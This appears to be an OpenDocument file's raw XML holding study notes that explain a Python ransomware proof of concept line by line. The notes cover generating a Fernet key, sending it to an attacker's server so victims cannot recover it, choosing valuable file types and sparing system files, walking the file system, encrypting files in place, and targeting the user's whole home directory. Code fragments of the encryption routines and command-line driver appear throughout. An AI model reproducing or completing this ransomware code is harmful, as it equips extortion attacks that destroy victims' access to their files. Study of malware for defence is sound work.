    <style:style style:name="T27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75"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7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77" style:parent-style-name="Standaardalinea-lettertype" style:family="text">
      <style:text-properties style:font-name="Consolas" style:font-name-complex="Consolas" fo:color="#24292E" fo:font-size="9pt" style:font-size-asian="9pt" style:font-size-complex="9pt" fo:background-color="#FFFFFF"/>
    </style:style>
    <style:style style:name="T278" style:parent-style-name="pl-k" style:family="text">
      <style:text-properties style:font-name="Consolas" style:font-name-complex="Consolas" fo:color="#D73A49" fo:font-size="9pt" style:font-size-asian="9pt" style:font-size-complex="9pt" fo:background-color="#FFFFFF"/>
    </style:style>
    <style:style style:name="T279" style:parent-style-name="Standaardalinea-lettertype" style:family="text">
      <style:text-properties style:font-name="Consolas" style:font-name-complex="Consolas" fo:color="#24292E" fo:font-size="9pt" style:font-size-asian="9pt" style:font-size-complex="9pt" fo:background-color="#FFFFFF"/>
    </style:style>
    <style:style style:name="TableColumn281" style:family="table-column">
      <style:table-column-properties style:column-width="0.8958in"/>
    </style:style>
    <style:style style:name="TableColumn282" style:family="table-column">
      <style:table-column-properties style:column-width="5.4041in"/>
    </style:style>
    <style:style style:name="Table280" style:family="table">
      <style:table-properties style:width="6.3in" fo:margin-left="0in" table:align="left"/>
    </style:style>
    <style:style style:name="TableRow283" style:family="table-row">
      <style:table-row-properties/>
    </style:style>
    <style:style style:name="TableCell284" style:family="table-cell">
      <style:table-cell-properties fo:border="none" fo:background-color="#FFFFFF" style:writing-mode="lr-tb" fo:padding-top="0in" fo:padding-left="0.1041in" fo:padding-bottom="0in" fo:padding-right="0.1041in"/>
    </style:style>
    <style:style style:name="P285" style:parent-style-name="Standaard" style:family="paragraph">
      <style:paragraph-properties fo:margin-bottom="0in" style:line-height-at-least="0.2083in"/>
    </style:style>
    <style:style style:name="T28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8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88"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8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90"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29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92" style:family="table-row">
      <style:table-row-properties/>
    </style:style>
    <style:style style:name="TableCell293" style:family="table-cell">
      <style:table-cell-properties fo:border="none" fo:background-color="#FFFFFF" style:writing-mode="lr-tb" fo:padding-top="0in" fo:padding-left="0.1041in" fo:padding-bottom="0in" fo:padding-right="0.1041in" fo:wrap-option="no-wrap"/>
    </style:style>
    <style:style style:name="P29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95" style:family="table-cell">
      <style:table-cell-properties fo:border="none" fo:background-color="#FFFFFF" style:writing-mode="lr-tb" fo:padding-top="0in" fo:padding-left="0.1041in" fo:padding-bottom="0in" fo:padding-right="0.1041in"/>
    </style:style>
    <style:style style:name="P296" style:parent-style-name="Standaard" style:family="paragraph">
      <style:paragraph-properties fo:margin-bottom="0in" style:line-height-at-least="0.2083in"/>
    </style:style>
    <style:style style:name="T29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98"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9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0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0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0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0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04" style:family="table-row">
      <style:table-row-properties/>
    </style:style>
    <style:style style:name="TableCell305" style:family="table-cell">
      <style:table-cell-properties fo:border="none" fo:background-color="#FFFFFF" style:writing-mode="lr-tb" fo:padding-top="0in" fo:padding-left="0.1041in" fo:padding-bottom="0in" fo:padding-right="0.1041in" fo:wrap-option="no-wrap"/>
    </style:style>
    <style:style style:name="P30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07" style:family="table-cell">
      <style:table-cell-properties fo:border="none" fo:background-color="#FFFFFF" style:writing-mode="lr-tb" fo:padding-top="0in" fo:padding-left="0.1041in" fo:padding-bottom="0in" fo:padding-right="0.1041in"/>
    </style:style>
    <style:style style:name="P308" style:parent-style-name="Standaard" style:family="paragraph">
      <style:paragraph-properties fo:margin-bottom="0in" style:line-height-at-least="0.2083in"/>
    </style:style>
    <style:style style:name="T30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1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1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12"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31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14" style:family="table-row">
      <style:table-row-properties/>
    </style:style>
    <style:style style:name="TableCell315" style:family="table-cell">
      <style:table-cell-properties fo:border="none" fo:background-color="#FFFFFF" style:writing-mode="lr-tb" fo:padding-top="0in" fo:padding-left="0.1041in" fo:padding-bottom="0in" fo:padding-right="0.1041in" fo:wrap-option="no-wrap"/>
    </style:style>
    <style:style style:name="P31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17" style:family="table-cell">
      <style:table-cell-properties fo:border="none" fo:background-color="#FFFFFF" style:writing-mode="lr-tb" fo:padding-top="0in" fo:padding-left="0.1041in" fo:padding-bottom="0in" fo:padding-right="0.1041in"/>
    </style:style>
    <style:style style:name="P318" style:parent-style-name="Standaard" style:family="paragraph">
      <style:paragraph-properties fo:margin-bottom="0in" style:line-height-at-least="0.2083in"/>
    </style:style>
    <style:style style:name="T31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2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2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22" style:family="table-row">
      <style:table-row-properties/>
    </style:style>
    <style:style style:name="TableCell323" style:family="table-cell">
      <style:table-cell-properties fo:border="none" fo:background-color="#FFFFFF" style:writing-mode="lr-tb" fo:padding-top="0in" fo:padding-left="0.1041in" fo:padding-bottom="0in" fo:padding-right="0.1041in" fo:wrap-option="no-wrap"/>
    </style:style>
    <style:style style:name="P32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25" style:family="table-cell">
      <style:table-cell-properties fo:border="none" fo:background-color="#FFFFFF" style:writing-mode="lr-tb" fo:padding-top="0in" fo:padding-left="0.1041in" fo:padding-bottom="0in" fo:padding-right="0.1041in"/>
    </style:style>
    <style:style style:name="P32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327" style:family="table-row">
      <style:table-row-properties/>
    </style:style>
    <style:style style:name="TableCell328" style:family="table-cell">
      <style:table-cell-properties fo:border="none" fo:background-color="#FFFFFF" style:writing-mode="lr-tb" fo:padding-top="0in" fo:padding-left="0.1041in" fo:padding-bottom="0in" fo:padding-right="0.1041in" fo:wrap-option="no-wrap"/>
    </style:style>
    <style:style style:name="P32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30" style:family="table-cell">
      <style:table-cell-properties fo:border="none" fo:background-color="#FFFFFF" style:writing-mode="lr-tb" fo:padding-top="0in" fo:padding-left="0.1041in" fo:padding-bottom="0in" fo:padding-right="0.1041in"/>
    </style:style>
    <style:style style:name="P331" style:parent-style-name="Standaard" style:family="paragraph">
      <style:paragraph-properties fo:margin-bottom="0in" style:line-height-at-least="0.2083in"/>
    </style:style>
    <style:style style:name="T33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33" style:parent-style-name="Standaardalinea-lettertype" style:family="text">
      <style:text-properties style:font-name="Consolas" style:font-name-asian="Times New Roman" style:font-name-complex="Consolas" fo:color="#E36209" fo:font-size="9pt" style:font-size-asian="9pt" style:font-size-complex="9pt" style:language-asian="nl" style:country-asian="NL"/>
    </style:style>
    <style:style style:name="T334"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35"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3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37" style:family="table-row">
      <style:table-row-properties/>
    </style:style>
    <style:style style:name="TableCell338" style:family="table-cell">
      <style:table-cell-properties fo:border="none" fo:background-color="#FFFFFF" style:writing-mode="lr-tb" fo:padding-top="0in" fo:padding-left="0.1041in" fo:padding-bottom="0in" fo:padding-right="0.1041in" fo:wrap-option="no-wrap"/>
    </style:style>
    <style:style style:name="P33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40" style:family="table-cell">
      <style:table-cell-properties fo:border="none" fo:background-color="#FFFFFF" style:writing-mode="lr-tb" fo:padding-top="0in" fo:padding-left="0.1041in" fo:padding-bottom="0in" fo:padding-right="0.1041in"/>
    </style:style>
    <style:style style:name="P341" style:parent-style-name="Standaard" style:family="paragraph">
      <style:paragraph-properties fo:margin-bottom="0in" style:line-height-at-least="0.2083in"/>
    </style:style>
    <style:style style:name="T34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3"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4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5"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34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7"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34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49" style:family="table-row">
      <style:table-row-properties/>
    </style:style>
    <style:style style:name="TableCell350" style:family="table-cell">
      <style:table-cell-properties fo:border="none" fo:background-color="#FFFFFF" style:writing-mode="lr-tb" fo:padding-top="0in" fo:padding-left="0.1041in" fo:padding-bottom="0in" fo:padding-right="0.1041in" fo:wrap-option="no-wrap"/>
    </style:style>
    <style:style style:name="P35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52" style:family="table-cell">
      <style:table-cell-properties fo:border="none" fo:background-color="#FFFFFF" style:writing-mode="lr-tb" fo:padding-top="0in" fo:padding-left="0.1041in" fo:padding-bottom="0in" fo:padding-right="0.1041in"/>
    </style:style>
    <style:style style:name="P35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354" style:family="table-row">
      <style:table-row-properties/>
    </style:style>
    <style:style style:name="TableCell355" style:family="table-cell">
      <style:table-cell-properties fo:border="none" fo:background-color="#FFFFFF" style:writing-mode="lr-tb" fo:padding-top="0in" fo:padding-left="0.1041in" fo:padding-bottom="0in" fo:padding-right="0.1041in" fo:wrap-option="no-wrap"/>
    </style:style>
    <style:style style:name="P35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57" style:family="table-cell">
      <style:table-cell-properties fo:border="none" fo:background-color="#FFFFFF" style:writing-mode="lr-tb" fo:padding-top="0in" fo:padding-left="0.1041in" fo:padding-bottom="0in" fo:padding-right="0.1041in"/>
    </style:style>
    <style:style style:name="P358" style:parent-style-name="Standaard" style:family="paragraph">
      <style:paragraph-properties fo:margin-bottom="0in" style:line-height-at-least="0.2083in"/>
    </style:style>
    <style:style style:name="T35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60"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3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62" style:family="table-row">
      <style:table-row-properties/>
    </style:style>
    <style:style style:name="TableCell363" style:family="table-cell">
      <style:table-cell-properties fo:border="none" fo:background-color="#FFFFFF" style:writing-mode="lr-tb" fo:padding-top="0in" fo:padding-left="0.1041in" fo:padding-bottom="0in" fo:padding-right="0.1041in" fo:wrap-option="no-wrap"/>
    </style:style>
    <style:style style:name="P36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65" style:family="table-cell">
      <style:table-cell-properties fo:border="none" fo:background-color="#FFFFFF" style:writing-mode="lr-tb" fo:padding-top="0in" fo:padding-left="0.1041in" fo:padding-bottom="0in" fo:padding-right="0.1041in"/>
    </style:style>
    <style:style style:name="P36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367" style:parent-style-name="Standaard" style:family="paragraph">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold"/>
    </style:style>
  </office:automatic-styles>
  <office:body>
    <office:text text:use-soft-page-breaks="true">
      <text:p text:style-name="P1">Ransomware<text:s/>: Program generatest the key and writes the key to a file.</text:p>
      <text:p text:style-name="P2">Self.key</text:p>
      <text:p text:style-name="Duidelijkcitaat">The<text:s/>program will run on the targeted system and it would generate a key, They key will lock up the files of the targeted system, so that the victim can’t open the file. The key needs to get send back to another system, so that the victim can’t recover the files with the key.</text:p>
      <text:p text:style-name="Standaard">You need a key to encrypt these files. The way it works, is that the key will lock up the files and they cannot open those files, until you actually use that key again. It would run on the target system and it would generate a key. It would send back the key to some server that you predetermined so that the targeted system no longer<text:s/>has access tot hat key and you do some things tot the memory of the victim, so that the key could not be recovered ater the program finished and encrypts all the files<text:s/></text:p>
      <text:p text:style-name="Standaard"/>
      <text:p text:style-name="Standaard"/>
      <text:p text:style-name="P3">Self.cryptor</text:p>
      <text:p text:style-name="Duidelijkcitaat">The cryptor is an object that does the encryption. The key uses this object to encrypt the files</text:p>
      <text:p text:style-name="Standaard">So next up we have this self dot cryptor or this crypto variable. This is just the actual object that does the encryption, so we are going to take the key that is generated with this from<text:s/>a libary. We are going to use an object or create an object out of the form a libary with that key and that is going to be able to do all the encryption and decryption of our files for us<text:s/></text:p>
      <text:p text:style-name="Standaard"/>
      <text:p text:style-name="P4">self.file_ext_targets=[‘txt’]</text:p>
      <text:p text:style-name="Duidelijkcitaat">You need to know what files you are going to encrypt. With this extension targets you are going to decide what type of files you are going t odecrypt.</text:p>
      <text:p text:style-name="Standaard">Generally speaking with ransomware you are going to have file extension targets and these file extension targets are essentially the types of files that you are going to encrypt so if you wanted to say encrypt tekst files, zip files whatever files you could potentially think of, its essentially if you are being attacked, they would be whatever files might be valuable<text:s/></text:p>
      <text:p text:style-name="Standaard">Nut you wouldn’t want to necessarily encrypt files that are required for the target system to run, because if the target system can no longer run to see their files and they can’t actually and they are not really gonna care that their files are encrypted. They are more or less lost and they would just<text:s/>that would be it.</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P5">FUNCTION DEF GENERATE_KEY</text:p>
      <text:p text:style-name="Standaard">A function called generate key. So our generate key function right here is actually just going to generate out initial key that we are going to use to lock up all the files, as we iterate over the files, starting at the top of the file system. So we generate that key and then we go ahead and we generate, we create this fernet object, passing in that key right there. So that will make the self.key an encryption key and the self.cryptor our fernet object.</text:p>
      <text:p text:style-name="Standaard"/>
      <text:p text:style-name="P6">FUNCTION<text:s/>def<text:s/>read_key(self,keyfile_name):</text:p>
      <text:p text:style-name="P7">FUNCTION<text:s/>def write_key(self,keyfile_name):</text:p>
      <text:p text:style-name="Standaard">This funtion writes the key to a file and then you can go ahead and read that key from that file and later we are going to decrypt the files again with this key.</text:p>
      <text:p text:style-name="Standaard"/>
      <text:p text:style-name="Standaard">Function<text:s/>def read_key(self,keyfile_name) en def write_key(self,keyfile_name)<text:s/>doesn’t really matter, these are just here for the proof of concept.</text:p>
      <text:p text:style-name="Standaard"/>
      <text:p text:style-name="P8">FUNCTION DEF CRYPT_ROOT(self,root_dir,encrypted=False):</text:p>
      <text:p text:style-name="Standaard"><text:span text:style-name="T9">This is the actual media program.</text:span><text:s/></text:p>
      <text:p text:style-name="Standaard"><text:span text:style-name="T10">for</text:span><text:span text:style-name="T11"><text:s/>root, _, files<text:s/></text:span><text:span text:style-name="T12">in</text:span><text:span text:style-name="T13"><text:s/>os.walk(root_dir):</text:span></text:p>
      <text:p text:style-name="Standaard">So this crypto root function is going to start at the very of the file system for the user and it is going to go ahead and its going to walk over those files with this OS.walk<text:s/>function here.<text:s/></text:p>
      <text:p text:style-name="Standaard">The<text:s/><text:span text:style-name="T14">for</text:span><text:s/>root is just going to be the rooth path here.</text:p>
      <text:p text:style-name="Standaard">_ <text:s/>This is just a placeholder that were directories would currently be, but its just a placeholder sinse we are only looking for files and then we have our files. This is basically saying: if we open up a folder, lets go ahaid and grab all the files from that folder and then find all the directories in that folder, go into those directories, grab all the files within those. Find the directories within those and continuing onwards. So then we are just basically go to say for all the files in the file system.</text:p>
      <text:p text:style-name="Standaard"/>
      <text:p text:style-name="Standaard"><text:span text:style-name="T15">for<text:s/></text:span>f<text:s/><text:span text:style-name="T16">in</text:span><text:s/>files:</text:p>
      <text:p text:style-name="Standaard"><text:s text:c="16"/>abs_file_path = os.path.join(root, f)</text:p>
      <text:p text:style-name="Standaard">We want to go ahead and get the absolute path so that is the path to that file starting from that root directory.</text:p>
      <table:table table:style-name="Table17">
        <table:table-columns>
          <table:table-column table:style-name="TableColumn18"/>
          <table:table-column table:style-name="TableColumn19"/>
        </table:table-columns>
        <table:table-row table:style-name="TableRow20">
          <table:table-cell table:style-name="TableCell21">
            <text:p text:style-name="P22"><text:span text:style-name="T23"># if not a file extension target, pass</text:span></text:p>
          </table:table-cell>
          <table:table-cell>
            <text:p text:style-name="P22"/>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow24">
          <table:table-cell table:style-name="TableCell25">
            <text:p text:style-name="P26"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell27">
            <text:p text:style-name="P28"><text:span text:style-name="T29"><text:s text:c="16"/></text:span><text:span text:style-name="T30">if</text:span><text:span text:style-name="T31"><text:s/></text:span><text:span text:style-name="T32">not</text:span><text:span text:style-name="T33"><text:s/>abs_file_path.split(</text:span><text:span text:style-name="T34">'.'</text:span><text:span text:style-name="T35">)[</text:span><text:span text:style-name="T36">-</text:span><text:span text:style-name="T37">1</text:span><text:span text:style-name="T38">]<text:s/></text:span><text:span text:style-name="T39">in</text:span><text:span text:style-name="T40"><text:s/></text:span><text:span text:style-name="T41">self</text:span><text:span text:style-name="T42">.file_ext_targets:</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow43">
          <table:table-cell table:style-name="TableCell44">
            <text:p text:style-name="P45"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell46">
            <text:p text:style-name="P47"><text:span text:style-name="T48"><text:s text:c="20"/></text:span><text:span text:style-name="T49">continue</text:span></text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Standaard"/>
      <text:p text:style-name="Standaard"><text:s/>We want to go ahead and check to see if the file extension for that specific file exist in our target files. So what we can do here : we say if not abs_file_path.split. Basically we are splitting it on all the dots which will split of file extensions<text:s/>and than we are going to say at the index of [-1], which is special python syntax for saying : alright this is the very last element in the array,which would be the file extension, so if that file extension is not in the file extension targets, that we are defining above and again in this case its only txt files, but you can add whatever you want there and then we have:<text:s/></text:p>
      <text:p text:style-name="Standaard"><text:span text:style-name="T50">self</text:span><text:span text:style-name="T51">.crypt_file(abs_file_path,<text:s/></text:span><text:span text:style-name="T52">encrypted</text:span><text:span text:style-name="T53">=</text:span><text:span text:style-name="T54">encrypted)</text:span></text:p>
      <text:p text:style-name="Standaard">We can encypt that file.With abs_file_path, we are passing the abs_file path and we specify a name variable encrypted. This is a way of telling the next function whether to encrypt or decrypt the file.</text:p>
      <text:p text:style-name="Standaard"/>
      <text:p text:style-name="Standaard"><text:span text:style-name="T55">Function def<text:s/></text:span><text:span text:style-name="T56">crypt_file</text:span><text:span text:style-name="T57">(</text:span><text:span text:style-name="T58">self</text:span><text:span text:style-name="T59">,<text:s/></text:span><text:span text:style-name="T60">file_path</text:span><text:span text:style-name="T61">,<text:s/></text:span><text:span text:style-name="T62">encrypted</text:span><text:span text:style-name="T63">=</text:span><text:span text:style-name="T64">False</text:span><text:span text:style-name="T65">)</text:span></text:p>
      <text:p text:style-name="Standaard">The function crypt file, we are passing in the file path that is in function crypt_root and this boolean parameter by Encryped is false, as to whether we want to encrypt or decrypt the file.</text:p>
      <text:p text:style-name="Standaard"/>
      <table:table table:style-name="Table66">
        <table:table-columns>
          <table:table-column table:style-name="TableColumn67"/>
          <table:table-column table:style-name="TableColumn68"/>
        </table:table-columns>
        <table:table-row table:style-name="TableRow69">
          <table:table-cell table:style-name="TableCell70">
            <text:p text:style-name="P71"/>
          </table:table-cell>
          <table:table-cell>
            <text:p text:style-name="P71"/>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow72">
          <table:table-cell table:style-name="TableCell73">
            <text:p text:style-name="P74"><text:span text:style-name="T75">with</text:span><text:span text:style-name="T76"><text:s/></text:span><text:span text:style-name="T77">open</text:span><text:span text:style-name="T78">(file_path,<text:s/></text:span><text:span text:style-name="T79">'rb+'</text:span><text:span text:style-name="T80">)<text:s/></text:span><text:span text:style-name="T81">as</text:span><text:span text:style-name="T82"><text:s/>f:</text:span></text:p>
          </table:table-cell>
          <table:table-cell>
            <text:p text:style-name="P74"/>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow83">
          <table:table-cell table:style-name="TableCell84">
            <text:p text:style-name="P85"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell86">
            <text:p text:style-name="P87"><text:span text:style-name="T88"><text:s text:c="12"/>_data<text:s/></text:span><text:span text:style-name="T89">=</text:span><text:span text:style-name="T90"><text:s/>f.read()</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow91">
          <table:table-cell table:style-name="TableCell92">
            <text:p text:style-name="P93"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell94">
            <text:p text:style-name="P95"/>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Standaard">It opens up a file path. So its going to read in the data regardless of wether its encrypted or decrypted, because once the file is encrypted( it is just essentially scrambled data and we can read that in and then we can use our key and open up or not unlock data, but i twill essentially take that scrambled data and convert it back to what it was.<text:s/></text:p>
      <text:p text:style-name="Standaard"/>
      <text:p text:style-name="Standaard">AGAIN : We are walking down the file path. We are finding all the files.<text:s/></text:p>
      <table:table table:style-name="Table96">
        <table:table-columns>
          <table:table-column table:style-name="TableColumn97"/>
          <table:table-column table:style-name="TableColumn98"/>
        </table:table-columns>
        <table:table-row table:style-name="TableRow99">
          <table:table-cell table:style-name="TableCell100">
            <text:p text:style-name="P101"><text:span text:style-name="T102">if</text:span><text:span text:style-name="T103"><text:s/></text:span><text:span text:style-name="T104">not</text:span><text:span text:style-name="T105"><text:s/>encrypted:</text:span></text:p>
          </table:table-cell>
          <table:table-cell>
            <text:p text:style-name="P101"/>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow106">
          <table:table-cell table:style-name="TableCell107">
            <text:p text:style-name="P108"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell109">
            <text:p text:style-name="P110"><text:span text:style-name="T111"><text:s text:c="16"/></text:span><text:span text:style-name="T112">print</text:span><text:span text:style-name="T113">(</text:span><text:span text:style-name="T114">f'File contents pre encryption:<text:s/></text:span><text:span text:style-name="T115">{</text:span><text:span text:style-name="T116">_data</text:span><text:span text:style-name="T117">}</text:span><text:span text:style-name="T118">'</text:span><text:span text:style-name="T119">)</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow120">
          <table:table-cell table:style-name="TableCell121">
            <text:p text:style-name="P122"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell123">
            <text:p text:style-name="P124"><text:span text:style-name="T125"><text:s text:c="16"/>data<text:s/></text:span><text:span text:style-name="T126">=</text:span><text:span text:style-name="T127"><text:s/></text:span><text:span text:style-name="T128">self</text:span><text:span text:style-name="T129">.cryptor.encrypt(_data)</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow130">
          <table:table-cell table:style-name="TableCell131">
            <text:p text:style-name="P132"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell133">
            <text:p text:style-name="P134"><text:span text:style-name="T135"><text:s text:c="16"/></text:span><text:span text:style-name="T136">print</text:span><text:span text:style-name="T137">(</text:span><text:span text:style-name="T138">f'File contents post encryption:<text:s/></text:span><text:span text:style-name="T139">{</text:span><text:span text:style-name="T140">data</text:span><text:span text:style-name="T141">}</text:span><text:span text:style-name="T142">'</text:span><text:span text:style-name="T143">)</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow144">
          <table:table-cell table:style-name="TableCell145">
            <text:p text:style-name="P146"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell147">
            <text:p text:style-name="P148"><text:span text:style-name="T149"><text:s text:c="12"/></text:span><text:span text:style-name="T150">else</text:span><text:span text:style-name="T151">:</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow152">
          <table:table-cell table:style-name="TableCell153">
            <text:p text:style-name="P154"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell155">
            <text:p text:style-name="P156"><text:span text:style-name="T157"><text:s text:c="16"/>data<text:s/></text:span><text:span text:style-name="T158">=</text:span><text:span text:style-name="T159"><text:s/></text:span><text:span text:style-name="T160">self</text:span><text:span text:style-name="T161">.cryptor.decrypt(_data)</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow162">
          <table:table-cell table:style-name="TableCell163">
            <text:p text:style-name="P164"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell165">
            <text:p text:style-name="P166"><text:span text:style-name="T167"><text:s text:c="16"/></text:span><text:span text:style-name="T168">print</text:span><text:span text:style-name="T169">(</text:span><text:span text:style-name="T170">f'File content post decryption:<text:s/></text:span><text:span text:style-name="T171">{</text:span><text:span text:style-name="T172">data</text:span><text:span text:style-name="T173">}</text:span><text:span text:style-name="T174">'</text:span><text:span text:style-name="T175">)</text:span></text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Standaard"/>
      <text:p text:style-name="Standaard">We are going ahead and we are calling this crypt file function and this crypt file function is opening up that file and if the file is not encrypted, we want to go ahead and encrypt that file and otherwise you want to decrypt that file. So again we are encrypting all the files or decrypting the files.</text:p>
      <text:p text:style-name="Standaard"/>
      <text:p text:style-name="Standaard"><text:span text:style-name="T176">f.seek(</text:span><text:span text:style-name="T177">0</text:span><text:span text:style-name="T178">)</text:span></text:p>
      <text:p text:style-name="Standaard"><text:span text:style-name="T179">f.write(data)</text:span></text:p>
      <text:p text:style-name="Standaard">We are going to the top of the file and we are going to write in that new data and that new data will either be the result of the encryption or the result of decryption.</text:p>
      <text:p text:style-name="Standaard"/>
      <table:table table:style-name="Table180">
        <table:table-columns>
          <table:table-column table:style-name="TableColumn181"/>
          <table:table-column table:style-name="TableColumn182"/>
        </table:table-columns>
        <table:table-row table:style-name="TableRow183">
          <table:table-cell table:style-name="TableCell184">
            <text:p text:style-name="P185"><text:span text:style-name="T186">if</text:span><text:span text:style-name="T187"><text:s/></text:span><text:span text:style-name="T188">__name__</text:span><text:span text:style-name="T189"><text:s/></text:span><text:span text:style-name="T190">==</text:span><text:span text:style-name="T191"><text:s/></text:span><text:span text:style-name="T192">'__main__'</text:span><text:span text:style-name="T193">:</text:span></text:p>
          </table:table-cell>
          <table:table-cell>
            <text:p text:style-name="P185"/>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow194">
          <table:table-cell table:style-name="TableCell195">
            <text:p text:style-name="P196"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell197">
            <text:p text:style-name="P198"><text:span text:style-name="T199"><text:s text:c="4"/></text:span><text:span text:style-name="T200"># sys_root = expanduser('~')</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow201">
          <table:table-cell table:style-name="TableCell202">
            <text:p text:style-name="P203"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell204">
            <text:p text:style-name="P205"><text:span text:style-name="T206"><text:s text:c="4"/>local_root<text:s/></text:span><text:span text:style-name="T207">=</text:span><text:span text:style-name="T208"><text:s/></text:span><text:span text:style-name="T209">'.'</text:span></text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Standaard"/>
      <text:p text:style-name="Standaard">For test cases, just using local root, which is just a variable that we assigned tot the exact directory that we are working in. What you could do if you want to target all the files, you would use the sys_root variable and thats gonna be expand user and so with this expand user passing in this little<text:s/>tilde ~, then that would go ahead to the root level of the users directory and it would iterate through all those files.<text:s/></text:p>
      <text:p text:style-name="Standaard"/>
      <table:table table:style-name="Table210">
        <table:table-columns>
          <table:table-column table:style-name="TableColumn211"/>
          <table:table-column table:style-name="TableColumn212"/>
        </table:table-columns>
        <table:table-row table:style-name="TableRow213">
          <table:table-cell table:style-name="TableCell214">
            <text:p text:style-name="P215"><text:span text:style-name="T216"><text:s text:c="2"/></text:span><text:span text:style-name="T217">import</text:span><text:span text:style-name="T218"><text:s/>argparse</text:span></text:p>
          </table:table-cell>
          <table:table-cell>
            <text:p text:style-name="P215"/>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow219">
          <table:table-cell table:style-name="TableCell220">
            <text:p text:style-name="P221"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell222">
            <text:p text:style-name="P223"><text:span text:style-name="T224"><text:s text:c="4"/>parser<text:s/></text:span><text:span text:style-name="T225">=</text:span><text:span text:style-name="T226"><text:s/>argparse.ArgumentParser()</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow227">
          <table:table-cell table:style-name="TableCell228">
            <text:p text:style-name="P229"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell230">
            <text:p text:style-name="P231"><text:span text:style-name="T232"><text:s text:c="4"/>parser.add_argument(</text:span><text:span text:style-name="T233">'--action'</text:span><text:span text:style-name="T234">,<text:s/></text:span><text:span text:style-name="T235">required</text:span><text:span text:style-name="T236">=</text:span><text:span text:style-name="T237">True</text:span><text:span text:style-name="T238">)</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow239">
          <table:table-cell table:style-name="TableCell240">
            <text:p text:style-name="P241"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell242">
            <text:p text:style-name="P243"><text:span text:style-name="T244"><text:s text:c="4"/>parser.add_argument(</text:span><text:span text:style-name="T245">'--keyfile'</text:span><text:span text:style-name="T246">)</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow247">
          <table:table-cell table:style-name="TableCell248">
            <text:p text:style-name="P249"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell250">
            <text:p text:style-name="P251"/>
            <text:p text:style-name="P252"/>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow253">
          <table:table-cell table:style-name="TableCell254">
            <text:p text:style-name="P255"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell256">
            <text:p text:style-name="P257"><text:span text:style-name="T258"><text:s text:c="4"/>args<text:s/></text:span><text:span text:style-name="T259">=</text:span><text:span text:style-name="T260"><text:s/>parser.parse_args()</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow261">
          <table:table-cell table:style-name="TableCell262">
            <text:p text:style-name="P263"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell264">
            <text:p text:style-name="P265"><text:span text:style-name="T266"><text:s text:c="4"/>action<text:s/></text:span><text:span text:style-name="T267">=</text:span><text:span text:style-name="T268"><text:s/>args.action.lower()</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="TableRow269">
          <table:table-cell table:style-name="TableCell270">
            <text:p text:style-name="P271"/>
          </table:table-cell>
          <table:table-cell table:style-name="TableCell272">
            <text:p text:style-name="P273"><text:span text:style-name="T274"><text:s text:c="4"/>keyfile<text:s/></text:span><text:span text:style-name="T275">=</text:span><text:span text:style-name="T276"><text:s/>args.keyfile</text:span></text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="Standaard"/>
      <text:p text:style-name="Standaard">These are arguments for running this as a command line program. <text:s/>Eventually this is just saying alright if we run this from command line, main.py –action encrypt. So this is going to do actually look for any kind of arguments that we might pass in the command line and then it will go ahead<text:s/></text:p>
      <text:p text:style-name="Standaard">With main.py -action encrypt, all the files will be encrypted. With –action decrpy, alle the files will be decrypted. With -action decrypt –keyfile ./path/to/keyfile, we just pass the path to the key file for decrypting.<text:s/></text:p>
      <text:p text:style-name="Standaard"/>
      <text:p text:style-name="Standaard"><text:span text:style-name="T277">rware<text:s/></text:span><text:span text:style-name="T278">=</text:span><text:span text:style-name="T279"><text:s/>Ransomware()</text:span></text:p>
      <text:p text:style-name="Standaard">So we create an instance for the ransomware class.</text:p>
      <text:p text:style-name="Standaard"/>
      <text:p text:style-name="Standaard"/>
      <table:table table:style-name="Table280">
